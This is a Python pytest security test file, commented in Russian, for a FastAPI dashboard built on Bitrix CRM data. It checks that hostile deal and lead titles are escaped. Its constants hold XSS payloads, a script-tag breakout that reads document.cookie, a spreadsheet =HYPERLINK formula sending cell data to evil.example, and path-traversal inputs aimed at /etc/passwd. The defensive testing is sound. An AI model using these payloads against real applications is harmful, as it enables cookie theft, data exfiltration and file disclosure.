"""Данные из Bitrix — не доверенные.

Заголовок сделки или лида приходит из CRM, а туда лид попадает с формы на
сайте: содержимое пишет посторонний человек. Всё, что из витрины уходит в
HTML, в JSON для графиков и в выгрузку, обязано это учитывать.
"""

import json

import pytest
import web  # noqa: F401  — кладёт src/web и src/analytics на sys.path
from fastapi.testclient import TestClient

import store
from app import create_app
from config import get_settings
from schema import analytics_session

BASE = "/dashboard"
LOGIN = "chief"
PASSWORD = "correct-horse-battery"

XSS_TITLE = "<img src=x onerror=alert(1)>"
SCRIPT_BREAKOUT = "</script><script>alert(document.cookie)</script>"
ATTR_BREAKOUT = '" onmouseover="alert(1)'
CSV_FORMULA = '=HYPERLINK("https://evil.example?c="&A1,"Отчёт")'


@pytest.fixture
def hostile_app(analytics_db, monkeypatch):
    monkeypatch.setenv("DASHBOARD_SECRET_KEY", "h" * 48)
    monkeypatch.setenv("DASHBOARD_COOKIE_SECURE", "false")
    get_settings.cache_clear()

    with analytics_session() as conn:
        conn.execute(
            "INSERT INTO dim_pipeline(category_id, name, is_active, sort, synced_at) "
            "VALUES (18, ?, 1, 10, 'x')", (XSS_TITLE,),
        )
        conn.execute(
            "INSERT INTO dim_stage(stage_id, category_id, name, sort, semantic, synced_at) "
            "VALUES ('C18:NEW', 18, ?, 10, 'in_progress', 'x')", (SCRIPT_BREAKOUT,),
        )
        conn.execute(
            "INSERT INTO dim_user(user_id, name, department_id, department_name, "
            "is_active, synced_at) VALUES (32, ?, 44, ?, 1, 'x')",
            (ATTR_BREAKOUT, XSS_TITLE),
        )
        conn.execute(
            "INSERT INTO dim_source(source_id, name, synced_at) VALUES ('CALL', ?, 'x')",
            (SCRIPT_BREAKOUT,),
        )
        for deal_id, title in ((1, XSS_TITLE), (2, SCRIPT_BREAKOUT), (3, CSV_FORMULA)):
            conn.execute(
                "INSERT INTO fact_deal(deal_id, title, category_id, stage_id, "
                "assigned_by_id, source_id, opportunity, date_create, is_closed, "
                "is_won, is_lost, is_deleted, synced_at) "
                "VALUES (?, ?, 18, 'C18:NEW', 32, 'CALL', 100, "
                "'2026-08-01T00:00:00+00:00', 0, 0, 0, 0, 'x')",
                (deal_id, title),
            )
            conn.execute(
                "INSERT INTO fact_stage_event(entity_type, entity_id, category_id, "
                "stage_id, entered_at, left_at, duration_sec, seq) "
                "VALUES ('deal', ?, 18, 'C18:NEW', '2026-08-01T00:00:00+00:00', "
                "NULL, NULL, 0)", (deal_id,),
            )
        conn.execute(
            "INSERT INTO fact_lead(lead_id, title, status_id, source_id, "
            "assigned_by_id, date_create, is_converted, is_deleted, synced_at) "
            "VALUES (9, ?, 'NEW', 'CALL', 32, '2026-08-01T00:00:00+00:00', 0, 0, 'x')",
            (XSS_TITLE,),
        )
        conn.execute(
            "INSERT INTO etl_run(kind, entity, started_at, finished_at, status, "
            "rows_upserted) VALUES ('backfill', '', '2026-08-20T10:00:00+00:00', "
            "'2026-08-20T10:01:00+00:00', 'ok', 3)"
        )

    application = create_app()
    store.create_user(LOGIN, PASSWORD, role="admin")
    return application


@pytest.fixture
def client(hostile_app):
    session = TestClient(hostile_app, follow_redirects=False)
    session.get(f"{BASE}/login")
    response = session.post(f"{BASE}/login", data={
        "username": LOGIN, "password": PASSWORD,
        "csrf_token": session.cookies.get("dash_csrf"), "next": "",
    })
    assert response.status_code == 303
    return session


PERIOD = "?start=2026-08-01&end=2026-08-31&category=18"


@pytest.mark.parametrize("path", [
    "/", "/leads", "/deals", "/movement", "/people", "/table", "/quality",
])
def test_hostile_crm_content_is_never_rendered_as_markup(client, path):
    body = client.get(f"{BASE}{path}{PERIOD}").text
    assert "<img src=x onerror=" not in body
    assert "<script>alert(" not in body
    assert 'onmouseover="alert' not in body


def test_hostile_title_cannot_break_out_of_a_json_island(client):
    """Данные графиков едут внутри <script type="application/json">.

    Заголовок с закрывающим тегом </script> завершил бы блок раньше времени,
    и остаток строки браузер начал бы исполнять как разметку.
    """
    body = client.get(f"{BASE}/deals{PERIOD}").text
    start = body.index('id="deal-funnel-data"')
    end = body.index("</script>", start)
    payload = body[body.index(">", start) + 1:end]
    # Полезная нагрузка обязана быть цельным JSON: если тег разорвали,
    # разбор упадёт или в куске не окажется данных.
    json.loads(payload)
    assert "</script>" not in payload


def test_search_input_is_not_reflected_as_markup(client):
    """Строка поиска возвращается в значение поля формы."""
    body = client.get(f"{BASE}/table{PERIOD}&q={ATTR_BREAKOUT}").text
    assert 'onmouseover="alert' not in body
    assert "&#34;" in body or "&quot;" in body


def test_csv_export_neutralises_spreadsheet_formulas(client):
    """Заголовок, начинающийся с «=», Excel исполнит как формулу.

    Классическая CSV-инъекция: выгрузку открывают в Excel, и ячейка вида
    =HYPERLINK(...) утаскивает содержимое соседних ячеек на чужой домен.
    Заголовок сделки пишет человек со стороны — через форму на сайте.
    """
    text = client.get(f"{BASE}/api/export.csv{PERIOD}").content.decode("utf-8-sig")
    for line in text.splitlines()[1:]:
        for cell in line.split(";"):
            stripped = cell.strip().strip('"')
            assert not stripped[:1] in ("=", "+", "-", "@", "\t", "\r"), (
                f"ячейка начинается с управляющего символа: {cell!r}"
            )
    # Содержимое при этом не потеряно — оно просто обезврежено.
    assert "HYPERLINK" in text


@pytest.mark.parametrize("path", [
    "/static/..%2f..%2fapp.py",
    "/static/%2e%2e/%2e%2e/app.py",
    "/static/....//....//etc/passwd",
    "/static//etc/passwd",
    "/static/css/%2e%2e/%2e%2e/store.py",
])
def test_static_prefix_cannot_be_used_to_escape_the_directory(client, path):
    """/static/ — единственный публичный префикс, и он не должен стать выходом.

    Путь с /static/ проходит белый список middleware, поэтому дальше защищать
    его обязана раздача статики. Здесь взяты закодированные варианты обхода:
    их http-клиент не нормализует, и до сервера они доезжают как есть — то
    есть проверяется именно серверное поведение, а не поведение клиента.
    """
    response = client.get(f"{BASE}{path}")
    assert response.status_code != 200, response.status_code
    assert b"root:" not in response.content
    assert b"create_app" not in response.content
    assert b"password_hash" not in response.content


def test_static_serves_only_its_own_assets(client):
    ok = client.get(f"{BASE}/static/css/app.css")
    assert ok.status_code == 200
    assert "--series-1" in ok.text
